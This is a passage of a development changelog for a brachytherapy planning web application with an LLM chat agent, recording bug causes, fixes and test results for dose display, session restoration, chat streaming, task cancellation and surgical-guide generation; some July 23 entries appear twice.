- Z alignment now matches on sagittal/coronal (peak row 21 == CTV z 21), which
  the transposed output placed on the horizontal axis.

---

### 3. Moving a structure to CTV/OAR cleared masks, dose, DVH, and guide

#### Confirmed issue

Reclassifying a structure ("Move to CTV"/"Move to OAR") in the Data Tree
disposed the CTV/OAR 3D meshes and cleared the dose heatmap, DVH curve, and
surgical guide from the viewer, even though needle geometry was unchanged.
The moved structure itself also disappeared from the 3D viewer because only
the 2D overlays and data tree were refreshed.

#### Root cause

`brachybot-viewer-volume.js` `_refreshAfterDataMutation` unconditionally called
`_clearInvalidatedPlanningPresentation(invalidated)` (which removed dose/DVH/
guide) after a structure mutation, and disposed the CTV/OAR meshes without
rebuilding the moved structure's mesh. The refresh only reloaded label volumes
(2D) and reapplied appearance; the disposed 3D mesh was never reconstructed.

#### Resolution

- **Operator choice preserved.** `moveSelectedStructures` now asks whether to
  replan with the new masks before refreshing:
  - "Replan" → proceeds with replanning (full refresh, no preservation).
  - "Just move" (or dismiss) → keeps the moved structures visible under their
    new parent's default presentation and preserves the current dose/DVH/guide
    as stale-but-visible evidence (`preserveDoseDvh: true`).
- `_refreshAfterDataMutation` honors `options.preserveDoseDvh`: when set, the
  `dose`, `dvh`, `evaluation`, `surgical_guide`, and `guide` items are
  excluded from `_clearInvalidatedPlanningPresentation`, so those artifacts
  remain on screen instead of being wiped by a simple reclassification.
- **3D mesh rebuild.** After reloading label volumes, the refresh now calls
  `startSegmentationMeshPrewarm('ctv', ...)` and
  `startSegmentationMeshPrewarm('oar', ...)` so the moved structure's mesh is
  reconstructed (the CTV/OAR meshes were disposed above and `loadLabelVolumes`
  only refreshes 2D overlays and the data tree).
- **Replan path.** Choosing "Replan" calls `replanAfterStructureChange`, which
  drives `refreshPlanningUI` with `autoGenerateGuide: true`; failures surface
  a chat error message and leave the moved structure in place for a later
  retry.

#### Verification

- Playwright: with "Just move" selected, `preserveDoseDvh` is true and dose/
  DVH/guide artifacts remain in the data tree; with "Replan" selected it is
  false and a replanning refresh runs.
- After a move (no replan), the moved structure's mesh is present in
  `scene3D.meshes` following the segmentation prewarm.

---

### Files changed

| File | Change |
|------|--------|
| `web/routes/surgical_guide_routes.py` | `guide_matches_current_plan` no longer requires `status == "ready"`; signature equality is authoritative |
| `web/structure_service.py` | `_stale_updates` no longer marks `surgical_guide` / `surgical_guide_versions` stale on structure changes |
| `web/app/static/js/brachybot-surgical-guide.js` | `activeSessionId()` prefers module scope; load paths accept matching-but-stale guides |
| `web/routes/planning_routes.py` | Removed `.T` transpose on sagittal/coronal dose-overlay and dose-contour slices |
| `web/app/static/js/brachybot-viewer-volume.js` | Structure-move confirmation; `preserveDoseDvh`; 3D mesh rebuild via segmentation prewarm; replan-after-move |
| `web/app/index.html` | Static-asset `?v=` bump (surgical-guide → `v7`, viewer-volume → `v17`) |

### Verification

- `pytest tests/test_round9_regressions.py tests/test_external_project_scope.py tests/test_chat_tasks.py tests/test_multi_agent_basic.py` — 41 passed.
- Playwright: guide display + Generate Guide button enabled; structure-move
  confirmation drives `preserveDoseDvh` per choice; dose overlay repaints on
  all three axes.
- Coordinate check: sagittal/coronal dose peak Z-row matches the CTV center Z
  after removing the transpose.

---

## 2026-07-24 - SSE streaming: NameError on `store` variable causes 500 on every chat request

### Confirmed issue

`POST /api/chat` (the SSE streaming path) always returned HTTP 500 with
`{"error": "Internal server error"}`. The backend agent worker thread processed
the request successfully (LLM responded, experience recorded), and the result
was later recoverable by refreshing the browser — confirming the chat handler
crashed AFTER spawning the worker but BEFORE delivering the SSE stream.

### Root cause

`planning_routes.py:2647` destructures `request_case_context()` as
```python
_, user, session_id = request_case_context()
```
discarding the first element (`store`) into `_`. At line 2689,
`store.load_snapshot(...)` references the undefined name `store`:

```python
snapshot = store.load_snapshot(user["id"], session_id)   # NameError!
```

The `except WorkspaceError` block at line 2717 does not catch `NameError`.
Because `start_gate.set()` runs in a `finally` block (line 2723), the worker
thread is released immediately after the error, which is why the LLM responds
visibly on the terminal while the HTTP handler returns 500.

### Resolution

Changed `planning_routes.py:2647` from:
```python
_, user, session_id = request_case_context()
```
to:
```python
store, user, session_id = request_case_context()
```

### Verification

- Server restarted, chat tested: SSE stream delivers the response in real time
  without requiring a browser refresh.
- `py_compile` passed for the modified route module.

---

## 2026-07-24 - Multi-Agent Router step missing pending state during routing

### Confirmed issue

After the "User Input" step completed, the Thinking chain showed no progress
for 10–15 seconds while the multi-agent router processed the request. The
"Multi-Agent Router" step only appeared when it finished (status: done),
leaving users with no indication of ongoing work.

### Root cause

`agent_runtime/chat_workflows.py:806-809` created and emitted the
"Multi-Agent Router" step AFTER `loop.run_until_complete()` returned.
The blocking call took >10 s while no SSE event was published to the
frontend.

### Resolution

Moved `add_step("thinking", "Multi-Agent Router", ..., status="pending")`
and the corresponding `yield yield_event("step", ...)` BEFORE the
blocking asyncio call at line 797.  After the result arrives, the same
step dict is updated in-place to `status="done"` (or `"error"`) and
emitted again — the frontend's existing block-update path in
`appendStepToChain` handles the transition smoothly.

### Verification

- `py_compile` passed for `agent_runtime/chat_workflows.py`.
- Server restart verified: pending step appears immediately in the
  Thinking chain, breathing animation runs during routing, transitions
  to done on completion.

---

## 2026-07-24 - Dose defaults and blocking agent checkpoint

### Confirmed issue

1. The manual-planning dose fields (`in_lowest_energy` /
   `out_highest_energy`) defaulted to a model-space value of 1
   (= 120 Gy at scale 120) through a hard-coded fallback of `1` in
   `doseGyToModel()`.

2. After every chat turn, the "Saving case results"
   (`workspace_checkpoint`) step remained pending for 10+ minutes.
   `finalize_chat_task` called `store.mark_operation()` which
   synchronously serialised every clinical numpy array (CT, OAR,
   dose, seed plan, etc.) to disk through `_ArtifactEncoder`.

### Resolution

1. Changed `doseGyToModel(..., 1)` → `doseGyToModel(...,
   doseModelScaleGy())` in both `brachybot-ui-api.js` (lines 147–148)
   and `brachybot-manual-annotation.js` (lines 173–174).

2. `planning_routes.py:251` replaced
   `store.mark_operation(task.user_id, task.session_id, task.agent,
   operation)` with `store.schedule_agent_checkpoint(...,
   "chat.task.finalized")`.  The agent arrays are now persisted
   asynchronously via the 0.75 s debounced timer; the chat transcript
   and operation metadata remain committed atomically through the
   snapshot-patch in the same function.

### Verification

- `py_compile` passed for the modified `planning_routes.py`.
- Dose fields show 120 Gy when no stored planning config is present.
- `workspace_checkpoint` transitions to done within seconds of chat
  completion, no longer blocking the SSE stream.

---

## 2026-07-24 - Workspace-checkpoint step visible to user and Gy display after restore

### Confirmed issue

1. The "Saving case results" (`workspace_checkpoint`) step appeared in the
   thinking chain after every chat turn and could remain pending for minutes
   while the backend persisted clinical arrays through the `_case_guard` lock.
   This was confusing to operators — the LLM had already produced the final
   response, but the progress dock showed an unfinished step.

2. When a workspace snapshot was restored, the `in_lowest_energy` and
   `out_highest_energy` dose fields displayed the raw model-space value (1)
   instead of the physical Gy equivalent (120).  `applyControls()` set
   `element.value` directly without calling `doseModelToGy()`.

### Resolution

1. `web/chat_tasks.py:282–304` – removed the `commit_step("pending")` /
   `commit_step("done")` emissions for `workspace_checkpoint`.  The
   terminal SSE `done` event now publishes immediately after the LLM
   stream ends; `on_finish` (which calls `finalize_chat_task` and
   persists chat results) runs synchronously afterwards but no longer
   blocks the SSE stream.  The earlier `schedule_agent_checkpoint`
   change (deferring heavy array serialisation to a 0.75 s timer)
   ensures the persistence steps are fast.

2. `web/app/static/js/brachybot-workspace.js` – `applyControls()` now
   detects dose-model fields (`inLowestEnergy`, `outHighestEnergy`) and
   converts stored model-space values (≤ 100) to physical Gy via
   `doseModelToGy()` before writing them to the DOM.  Already-physical
   values (> 100) pass through unchanged.

### Verification

- `py_compile` passed for `chat_tasks.py` and `planning_routes.py`.
- Workspace restore after a planning session now shows 120 Gy in the
  dose constraint fields instead of 1.
- The thinking chain no longer shows a "Saving case results" step;
  the final response appears as the last visible element.

---

## 2026-07-24 — Progress dock state lost on session switch (wrong save key)

### Confirmed issue

When switching from session A (with a running task and active Progress dock)
to session B and back, the dock's completed steps disappeared and the timer
reset.  The per-session save logic used `activeSessionId` as the storage
key, but `paintSessionShell` had already advanced `activeSessionId` to the
new (target) case before `clearClientWorkspace` → `clearCaseScopedProgressPresentation`
ran.  The old session's items were therefore saved under the *new* session's
ID rather than the owning session's ID.

### Resolution

1. `_todoCreate()` now stamps `api._sessionId` with the owning session
   ID at creation time.
2. `clearCaseScopedProgressPresentation()` reads `todo._sessionId` instead
   of the current `activeSessionId`, ensuring the items are persisted under
   the correct per-session key.
3. `sendChat()` when `isResumingTask` restores items from
   `window._caseTodos[turnSessionId]` (already in place from the previous
   round's fix).

### Verification

- Restart server, start a planning task in session A, switch to B, switch
  back to A — completed steps remain visible and the elapsed-time display
  continues from the original `startedAt` timestamps, reflecting the real
  wall-clock duration including the time the user spent viewing other cases.

---

## 2026-07-24 — SSE idle timeout disconnected the browser during long planning runs

### Confirmed issue

The frontend SSE reader used a fixed 90 s idle timeout (`CHAT_IDLE_TIMEOUT_MS`).
Medical planning tools (ctv_segmentation ~86 s, oar_segmentation ~63 s,
planning_pipeline ~567 s) emit **no SSE events while executing** — sub-step
and progress events are buffered and flushed only after the tool returns.
The idle timeout therefore fired mid-planning, `turnAbortController.abort()`
closed the SSE stream, and the browser received no events after the
disconnection — including the final LLM response and review result.

### Resolution

`sendChat` in `brachybot-chat-todo.js` now dynamically switches the idle
timeout based on the Progress dock state:
- Normal chat (no active tools): 90 s default
- Active planning (`todo.items` contain `active` or `pending` status):
  `CHAT_PLANNING_IDLE_TIMEOUT_MS = 900 s` (15 min)

### Verification

- `node --check` passed for the modified JS file.

---

## 2026-07-24 — Orchestrator completeness checker crashed on non-picklable context

### Confirmed issue

`MultiAgentOrchestrator.update_global_context()` and `_context_snapshot()` used
`copy.deepcopy` to freeze the shared review context.  When the agent memory
passed `conversation_state` containing objects with `_thread.RLock` internals,
`deepcopy` raised `pickle.PicklingError: cannot pickle '_thread.RLock'`.
This crashed the completeness checker, leaving the agent in a broken state:
subsequent chat turns hung on "Thinking" and session switching was blocked.

### Resolution

`agents/orchestrator.py` — replaced `copy.deepcopy` with a custom
`_safe_deepish(value)` helper that gracefully degrades: dicts and lists are
recursively copied element by element; any non-picklable scalar is returned
as-is.  Catches `TypeError`, `AttributeError`, and `pickle.PicklingError`.

### Verification

- `py_compile` passed for the modified module.

---

## 2026-07-24 — Thinking chain timer reset on resume after session switch

### Confirmed issue

The thinking chain header timer was saved inside the SSE `step` event handler,
which only executes after the first step event arrives.  During a task resume
the saved timestamp was not reliably available, causing
`createLiveThinkingChain` to fall back to `Date.now()` and the elapsed-time
display to restart from 0.0 s.

### Resolution

`brachybot-chat-todo.js` — `_caseChainStartedAt[turnSessionId]` is now saved
at the `sendChat` entry point (after `showThinkingIndicator()`, before the SSE
connection opens), guaranteeing the timestamp exists before any events are
processed.  `createLiveThinkingChain` accepts `resumeStartTime`: when set, the
header clock shows `(Date.now() - resumeStartTime)` — the true background
elapsed time — instead of resetting.

### Verification

- `node --check` passed for the modified JS file.

---

## 2026-07-23 - Active-case agents are protected from cache eviction

### Confirmed issue

The in-memory Agent cache was correctly keyed by account and case, but its LRU
and timeout cleanup did not consult detached chat tasks. A long-running
planning/chat task could therefore lose its authoritative Agent instance after
a cache-pressure eviction or idle timeout. A later viewer request could hydrate
a second Agent from the last checkpoint while the original task continued in
the background, creating a real stale-state recovery risk.

### Resolution

1. **Task-aware cache maintenance.** The cache now asks the case-scoped chat
   task manager whether a case still owns a running worker before evicting or
   expiring its Agent.
2. **Correctness over soft cache limits.** If every cached Agent is actively
   executing, the process temporarily exceeds the LRU limit instead of
   duplicating or interrupting a clinical case. The bound applies again once
   a task reaches its durable completion boundary.
3. **Fail-closed maintenance.** If task-status introspection itself fails, the
   cache conservatively retains the Agent; maintenance never decides to evict
   a possibly active planning worker.

### Verification

- Added a focused unit regression for task-aware cache protection.
- Focused chat/session-transition suite: **64 passed**.
- Full local suite: **293 passed, 2 skipped**.
- Full configured remote-runtime suite: **292 passed, 3 skipped**.

## 2026-07-23 - Puncture-guide parameters remain case-owned during editing

### Confirmed issue

The puncture-guide panel already sent its dimensions to the generator, but a
multi-select HTML control serialised only its first selected needle through the
generic workspace form snapshot. Numeric fields also waited for a `change`
event, which meant an in-progress edit was not scheduled for persistence until
the field lost focus. This could silently change the selected-channel subset or
lose a just-edited manufacturing parameter after a rapid case switch.

### Resolution

1. **Complete channel-set persistence.** Workspace form snapshots now preserve
   and restore every selected option of any multi-select control. Guide
   versions therefore retain their chosen needle channels along with their
   plate, bore, and sleeve geometry.
2. **Responsive parameter checkpointing.** Each guide input schedules a
   case-owned save while it is being edited and again on commit. Generation
   remains explicit: edits never mutate an existing validated guide or STL.
3. **Operator reset.** The parameter panel now offers an explicit restore
   defaults control. Resetting schedules a durable case checkpoint rather than
   leaving stale values in a browser-only form.

### Verification

- Added regression coverage for all exposed guide controls, diameter-to-radius
  conversion, input/change checkpoint hooks, multiselect serialization, and
  full parameter preservation in a watertight generated guide.
- Local targeted suite: **62 passed**; JavaScript syntax checks passed for the
  workspace and guide modules.

## 2026-07-23 - Explicit chat cancellation is a durable terminal boundary

### Confirmed issue

The detached chat worker marked a task as cancelled after the user pressed the
explicit Stop control, but a provider could still yield buffered tool, text, or
terminal events afterwards. Those late events could be appended to the
case-owned replay journal and appear again when the case was reopened in
another browser. This was a real task-lifecycle race, distinct from intentional
non-destructive session switching.

### Resolution

1. **Single cancellation terminal event.** A successful explicit cancellation
   now atomically changes the task status and appends exactly one replayable
   `done(cancelled)` event before invoking the provider cancellation hook.
2. **Late-event fence.** The background worker checks task state before and
   after decoding every provider event. Once stopped, buffered events are
   discarded rather than being published, persisted, or replayed.
3. **Replay-safe UI behavior.** A browser that reconnects to a cancelled task
   renders the terminal stopped state instead of manufacturing an empty
   assistant response or a false planning refresh.
4. **Durable transcript policy.** Cancelled turns retain the user request and
   trace for audit together with one `Stopped.` status. Partial provider prose
   is deliberately not restored as a completed assistant answer.

### Verification

- Added a deterministic buffered-provider regression that cancels after the
  first stream event, then verifies that late response text is absent and the
  journal contains exactly one cancelled terminal event.
- Remote configured-runtime suite: **289 passed, 3 skipped, 3 warnings**.
- Local session-transition, workspace frontend, and chat-task contracts:
  **62 passed**.
- Python compilation, JavaScript syntax checking, and `git diff --check`
  passed for the modified modules.

## 2026-07-23 - Patient-specific puncture-guide controls and physical geometry

### Confirmed implementation gap

The workspace did not expose the manufacturing dimensions of the native
patient-specific puncture guide. This made skin offset, plate thickness, guide
hole/sleeve diameters, sleeve lengths, selected needle channels, and local
geometry resolution effectively fixed implementation details. There was also
no operator-facing way to validate an STL after it had been exported and
modified by an external manufacturing workflow.

### Resolution

1. **Case-owned guide parameter panel.** The Input panel now exposes all
   clinically meaningful guide dimensions in millimetres. The user specifies
   channel and sleeve diameters; the browser converts them exactly once to the
   geometry service's radius convention. Values are persisted with the case
   and do not mutate an existing guide until the user explicitly generates a
   new version.

2. **Physical-coordinate construction.** The guide uses the existing
   SimpleITK patient-world coordinate chain. A bounded CT crop is resampled to
   an exact isotropic physical lattice using nearest-neighbour coordinate
   sampling, not shape-based zoom. This keeps plate and hole dimensions
   independent of anisotropic acquisition spacing and supports non-identity
   direction matrices without adding RAS/LPS flips.

3. **Robust native solid construction.** The CT-derived skin shell, local
   patch, outer sleeves, and finite internal bores are combined as one implicit
   volume before marching-cubes extraction. This deliberately avoids fragile
   coplanar polygonal booleans while retaining the audited functional stages
   of the legacy C++/VTK/CGAL guide workflow.

4. **Versions, stale detection, and STL QA.** Each generation captures the
   chosen parameters and needle subset in a retained case-owned version. A
   plan geometry edit marks all versions stale. Export and user-selected STL
   re-import validation both enforce finite vertices, valid indices, and
   strict two-face edge closure; the re-import validator is read-only and
   limited to 64 MiB, so it cannot replace patient geometry or consume an
   unbounded amount of server memory.

### Verification

- `tests/test_surgical_guide.py` covers watertight STL round-trip, missing
  geometry rejection, anisotropic/flipped-direction physical coordinates,
  version/stale semantics, and the shared UI/agent guide-version contract.
- JavaScript is syntax checked before deployment. The deployment host runs the
  guide regression suite with the same SimpleITK/scipy/skimage dependencies
  used in production.
- Detailed workflow and clinical/manufacturing boundaries are documented in
  `docs/PATIENT_SPECIFIC_PUNCTURE_GUIDE.md`.
- Deployment-host full regression suite after the guide-tool contract update:
  **288 passed, 3 skipped** (three external SWIG deprecation
  warnings only).

## 2026-07-23 - Transactional cross-session clinical restoration

### Confirmed issue

Returning to a completed case could produce a split workspace: 2D canvases
showed the restored CT and label voxels, while the Input panel was blank, the
Data Tree had an empty OAR group, and planning-dependent 3D, DVH, and report
content appeared absent. This was not a segmentation or coordinate problem.
The restore transaction first hydrated authoritative CT/label/plan data from
the selected server workspace, then applied a whole browser UI snapshot. A
stale snapshot could therefore replace the freshly rebuilt Data Tree topology,
clinical input paths, and planning state with an earlier empty client copy.

### Resolution

1. **Separate authoritative clinical restoration from presentation restoration.**
   CT, CTV/OAR paths, label topology, organ names, planning geometry, dose,
   DVH, and report inputs are rebuilt from the selected server workspace only.
   The browser snapshot now restores only safe preferences: viewer slices and
   layout, camera pose, Data Tree visibility/opacity/color/material settings,
   report edits, chat presentation, and training display state.

2. **Expose case-owned input paths in the status contract.**
   `/api/status` now returns the selected workspace's `ct_path`, `ctv_path`,
   and `oar_path`. The Input panel is populated from those owned server values
   before CT hydration; it no longer depends on stale form controls from a
   previous case.

3. **Guard every deferred planning and dose render by session identity.**
   Case changes invalidate debounced planning refreshes and dose-overlay
   metadata requests. A background task remains alive on its owning case, but
   a late result is discarded unless its session and render generation still
   match the selected workspace. This preserves the rule that only explicit
   Stop cancels a server task, while preventing its visual artifacts from
   leaking into another case.

4. **Keep progress presentation case-scoped.**
   Workspace clearing removes only browser-side progress/timers for the case
   shell being replaced. It does not abort the detached server task. Returning
   to that case replays the persisted prompt and task trace from its own event
   journal rather than inheriting progress from a different session.

5. **Deduplicate task replay during two-phase restoration.** A lightweight
   snapshot and the later clinical hydration can both observe the same running
   task. Replay subscriptions are now single-flight per case and retain the
   session identity captured by their scheduling timer. This prevents one
   replay from cancelling or clearing another, which previously left an old
   Progress timer visible while the send button had returned to idle.

### Verification

- Added regression coverage for presentation-only snapshot merging, explicit
  CT/CTV/OAR status paths, and stale planning/dose response invalidation.
- Modified JavaScript is syntax-checked with Node, and the changed Python
  route is bytecode-compiled before release.
- Focused workspace frontend and authenticated workspace integration tests are
  run again after synchronization on the deployment host.

---

## 2026-07-23 - Active-case agents are protected from cache eviction

### Confirmed issue

The in-memory Agent cache was correctly keyed by account and case, but its LRU
and timeout cleanup did not consult detached chat tasks. A long-running
planning/chat task could therefore lose its authoritative Agent instance after
a cache-pressure eviction or idle timeout. A later viewer request could hydrate
a second Agent from the last checkpoint while the original task continued in
the background, creating a real stale-state recovery risk.

### Resolution

1. **Task-aware cache maintenance.** The cache now asks the case-scoped chat
   task manager whether a case still owns a running worker before evicting or
   expiring its Agent.
2. **Correctness over soft cache limits.** If every cached Agent is actively
   executing, the process temporarily exceeds the LRU limit instead of
   duplicating or interrupting a clinical case. The bound applies again once
   a task reaches its durable completion boundary.
3. **Fail-closed maintenance.** If task-status introspection itself fails, the
   cache conservatively retains the Agent; maintenance never decides to evict
   a possibly active planning worker.

### Verification

- Added a focused unit regression for task-aware cache protection.
- Focused chat/session-transition suite: **64 passed**.
- Full local suite: **293 passed, 2 skipped**.
- Full configured remote-runtime suite: **292 passed, 3 skipped**.

## 2026-07-23 - Puncture-guide parameters remain case-owned during editing

### Confirmed issue

The puncture-guide panel already sent its dimensions to the generator, but a
multi-select HTML control serialised only its first selected needle through the
generic workspace form snapshot. Numeric fields also waited for a `change`
event, which meant an in-progress edit was not scheduled for persistence until
the field lost focus. This could silently change the selected-channel subset or
lose a just-edited manufacturing parameter after a rapid case switch.

### Resolution

1. **Complete channel-set persistence.** Workspace form snapshots now preserve
   and restore every selected option of any multi-select control. Guide
   versions therefore retain their chosen needle channels along with their
   plate, bore, and sleeve geometry.
2. **Responsive parameter checkpointing.** Each guide input schedules a
   case-owned save while it is being edited and again on commit. Generation
   remains explicit: edits never mutate an existing validated guide or STL.
3. **Operator reset.** The parameter panel now offers an explicit restore
   defaults control. Resetting schedules a durable case checkpoint rather than
   leaving stale values in a browser-only form.

### Verification

- Added regression coverage for all exposed guide controls, diameter-to-radius
  conversion, input/change checkpoint hooks, multiselect serialization, and
  full parameter preservation in a watertight generated guide.
- Local targeted suite: **62 passed**; JavaScript syntax checks passed for the
  workspace and guide modules.

## 2026-07-23 - Explicit chat cancellation is a durable terminal boundary

### Confirmed issue

The detached chat worker marked a task as cancelled after the user pressed the
explicit Stop control, but a provider could still yield buffered tool, text, or
terminal events afterwards. Those late events could be appended to the
case-owned replay journal and appear again when the case was reopened in
another browser. This was a real task-lifecycle race, distinct from intentional
non-destructive session switching.

### Resolution

1. **Single cancellation terminal event.** A successful explicit cancellation
   now atomically changes the task status and appends exactly one replayable
   `done(cancelled)` event before invoking the provider cancellation hook.
2. **Late-event fence.** The background worker checks task state before and
   after decoding every provider event. Once stopped, buffered events are
   discarded rather than being published, persisted, or replayed.
3. **Replay-safe UI behavior.** A browser that reconnects to a cancelled task
   renders the terminal stopped state instead of manufacturing an empty
   assistant response or a false planning refresh.
4. **Durable transcript policy.** Cancelled turns retain the user request and
   trace for audit together with one `Stopped.` status. Partial provider prose
   is deliberately not restored as a completed assistant answer.

### Verification

- Added a deterministic buffered-provider regression that cancels after the
  first stream event, then verifies that late response text is absent and the
  journal contains exactly one cancelled terminal event.
- Remote configured-runtime suite: **289 passed, 3 skipped, 3 warnings**.
- Local session-transition, workspace frontend, and chat-task contracts:
  **62 passed**.
- Python compilation, JavaScript syntax checking, and `git diff --check`
  passed for the modified modules.

## 2026-07-23 - Patient-specific puncture-guide controls and physical geometry

### Confirmed implementation gap

The workspace did not expose the manufacturing dimensions of the native
patient-specific puncture guide. This made skin offset, plate thickness, guide
hole/sleeve diameters, sleeve lengths, selected needle channels, and local
geometry resolution effectively fixed implementation details. There was also
no operator-facing way to validate an STL after it had been exported and
modified by an external manufacturing workflow.

### Resolution

1. **Case-owned guide parameter panel.** The Input panel now exposes all
   clinically meaningful guide dimensions in millimetres. The user specifies
   channel and sleeve diameters; the browser converts them exactly once to the
   geometry service's radius convention. Values are persisted with the case
   and do not mutate an existing guide until the user explicitly generates a
   new version.

2. **Physical-coordinate construction.** The guide uses the existing
   SimpleITK patient-world coordinate chain. A bounded CT crop is resampled to
   an exact isotropic physical lattice using nearest-neighbour coordinate
   sampling, not shape-based zoom. This keeps plate and hole dimensions
   independent of anisotropic acquisition spacing and supports non-identity
   direction matrices without adding RAS/LPS flips.

3. **Robust native solid construction.** The CT-derived skin shell, local
   patch, outer sleeves, and finite internal bores are combined as one implicit
   volume before marching-cubes extraction. This deliberately avoids fragile
   coplanar polygonal booleans while retaining the audited functional stages
   of the legacy C++/VTK/CGAL guide workflow.

4. **Versions, stale detection, and STL QA.** Each generation captures the
   chosen parameters and needle subset in a retained case-owned version. A
   plan geometry edit marks all versions stale. Export and user-selected STL
   re-import validation both enforce finite vertices, valid indices, and
   strict two-face edge closure; the re-import validator is read-only and
   limited to 64 MiB, so it cannot replace patient geometry or consume an
   unbounded amount of server memory.

### Verification

- `tests/test_surgical_guide.py` covers watertight STL round-trip, missing
  geometry rejection, anisotropic/flipped-direction physical coordinates,
  version/stale semantics, and the shared UI/agent guide-version contract.
- JavaScript is syntax checked before deployment. The deployment host runs the
  guide regression suite with the same SimpleITK/scipy/skimage dependencies
  used in production.
- Detailed workflow and clinical/manufacturing boundaries are documented in
  `docs/PATIENT_SPECIFIC_PUNCTURE_GUIDE.md`.
- Deployment-host full regression suite after the guide-tool contract update:
  **288 passed, 3 skipped** (three external SWIG deprecation
  warnings only).

## 2026-07-23 - Transactional cross-session clinical restoration

### Confirmed issue

Returning to a completed case could produce a split workspace: 2D canvases
showed the restored CT and label voxels, while the Input panel was blank, the
Data Tree had an empty OAR group, and planning-dependent 3D, DVH, and report
content appeared absent. This was not a segmentation or coordinate problem.
The restore transaction first hydrated authoritative CT/label/plan data from
the selected server workspace, then applied a whole browser UI snapshot. A
stale snapshot could therefore replace the freshly rebuilt Data Tree topology,
clinical input paths, and planning state with an earlier empty client copy.

### Resolution

1. **Separate authoritative clinical restoration from presentation restoration.**
   CT, CTV/OAR paths, label topology, organ names, planning geometry, dose,
   DVH, and report inputs are rebuilt from the selected server workspace only.
   The browser snapshot now restores only safe preferences: viewer slices and
   layout, camera pose, Data Tree visibility/opacity/color/material settings,
   report edits, chat presentation, and training display state.

2. **Expose case-owned input paths in the status contract.**
   `/api/status` now returns the selected workspace's `ct_path`, `ctv_path`,
   and `oar_path`. The Input panel is populated from those owned server values
   before CT hydration; it no longer depends on stale form controls from a
   previous case.

3. **Guard every deferred planning and dose render by session identity.**
   Case changes invalidate debounced planning refreshes and dose-overlay
   metadata requests. A background task remains alive on its owning case, but
   a late result is discarded unless its session and render generation still
   match the selected workspace. This preserves the rule that only explicit
   Stop cancels a server task, while preventing its visual artifacts from
   leaking into another case.

4. **Keep progress presentation case-scoped.**
   Workspace clearing removes only browser-side progress/timers for the case
   shell being replaced. It does not abort the detached server task. Returning
   to that case replays the persisted prompt and task trace from its own event
   journal rather than inheriting progress from a different session.

5. **Deduplicate task replay during two-phase restoration.** A lightweight
   snapshot and the later clinical hydration can both observe the same running
   task. Replay subscriptions are now single-flight per case and retain the
   session identity captured by their scheduling timer. This prevents one
   replay from cancelling or clearing another, which previously left an old
   Progress timer visible while the send button had returned to idle.

### Verification

- Added regression coverage for presentation-only snapshot merging, explicit
  CT/CTV/OAR status paths, and stale planning/dose response invalidation.
- Modified JavaScript is syntax-checked with Node, and the changed Python
  route is bytecode-compiled before release.
- Focused workspace frontend and authenticated workspace integration tests are
  run again after synchronization on the deployment host.

---

## 2026-07-22 - Workspace lease identity, instant needle restore, and bounded OAR volume metrics

### Confirmed issues and resolutions

1. **False read-only takeover banner after reload or a lease request failure.**
   The browser previously treated every failed lease heartbeat as evidence that
   another browser owned the case. In addition, lease requests relied on the
   Flask session's selected case even while the browser was switching cases.
   The editor token now survives reloads in origin-scoped `localStorage` (with
   migration from the old `sessionStorage` token), every lease request carries
   and validates the selected owned `session_id`, and the UI shows the takeover
   banner only for the authenticated `workspace_locked` response. Network or
   server failures keep the normal connection state and do not falsely accuse
   another editor. Explicit takeover remains available and reports its progress
   through the existing animated notice/toast path.

2. **Restoring one accidentally dragged needle unnecessarily entered the slow
   manual-dose path.** The automatic plan now stores immutable needle/seed,
   dose-grid, dose-metric, and DVH baselines at the successful planning
   checkpoint. When all other geometry is unchanged, restoring a needle copies
   those validated baseline artifacts and completes without another model
   inference. If other geometry was also edited or a baseline is unavailable,
   the request deliberately falls back to the normal AI recomputation path.
   Both paths expose a persistent indeterminate progress row with elapsed time,
   and finish with an explicit success or error state.

3. **OAR V100 values above 100% in reports.** This was a real unit-contract
   problem at multiple boundaries: planning and manual dose metrics now store
   V100/V150/V200 as fractions, while report/UI boundaries convert exactly once
   to percentages. The report, auto-fill, DVH table, and server patch builders
   also normalize legacy rows that were double-scaled (for example `350.3%`
   is rendered as `3.5%`) and clamp the final display to the physically valid
   `[0, 100]` interval. This prevents impossible output without changing the
   underlying dose grid or coordinate chain.

### Verification

- Focused lease, frontend, metric-unit, and restore regressions: **49 passed**.
- Python syntax/bytecode compilation and modified JavaScript syntax checks pass.
- The new regression suite covers fraction, percentage, legacy double-scaled,
  out-of-range, and non-finite OAR volume inputs.
- Full repository suite: **240 passed, 2 skipped, 3 warnings**.

---

## 2026-07-19 - Round 52: Case-scoped deferred viewer restoration

**Confirmed issue:** `restoreSceneView()` deliberately reapplied saved camera,
DVH, and dose-surface state after asynchronous mesh reconstruction. The delayed
callbacks were not tied to a case identity. A rapid session switch could
therefore let callbacks from the prior workspace apply presentation state to the
newly selected case.

**Resolution:** Added a generation token and a tracked timer set in
`brachybot-workspace.js`. Starting a case transition or applying a newer
workspace snapshot invalidates every earlier deferred restoration callback.
Deferred scene, DVH, and dose-surface work executes only when its captured
generation remains current.

This intentionally changes presentation timing only; it does not alter
persisted clinical data, coordinate transforms, planning state, or viewer reset
semantics.

**Verification:** Added a Node runtime regression that restores case A, then
immediately restores case B and waits for all deferred callbacks; the final
camera remains case B's. Focused workspace/auth browser-bridge tests and
JavaScript syntax checks pass locally.

---

## 2026-07-17 - Round 9: Full needle-path obstacle validation

**Audit base:** GitHub `main` at `6161ab4`, the remote planning pipeline, and the user-provided 3D reconstruction showing multiple needle paths passing through colored obstacle meshes.

**Confirmed root cause:** the previous obstacle gate validated a candidate's finite segment on the resampled planning grid. The 3D viewer then independently rebuilt each automatic needle by extending it 150 mm from the shallowest seed toward the skin. That full physical segment was never checked on the original CT/OAR grid, so a candidate could pass planning validation while its displayed and clinically relevant insertion path crossed a non-traversable structure. The manual needle-drag endpoint API had the same bypass because it accepted explicit world-coordinate lines without an obstacle check.

| Surface | Correction |
|---|---|
| Default obstacle policy | Bone, cartilage, vessels, nerves, and spinal cord remain a mandatory backend baseline. Data Tree classifications can add case-specific non-traversable OARs but cannot silently downgrade the baseline through an incomplete or stale client snapshot. |
| Automatic trajectory generation | Candidate trajectories now receive a second validation on the complete world-coordinate needle line, including the established 150 mm external insertion extension. Sampling adapts to at most half the smallest original voxel spacing, then each sample is transformed through `SimpleITK.TransformPhysicalPointToContinuousIndex` into the original CT/OAR grid; no new RAS/LPS or voxel-order conversion is introduced. |
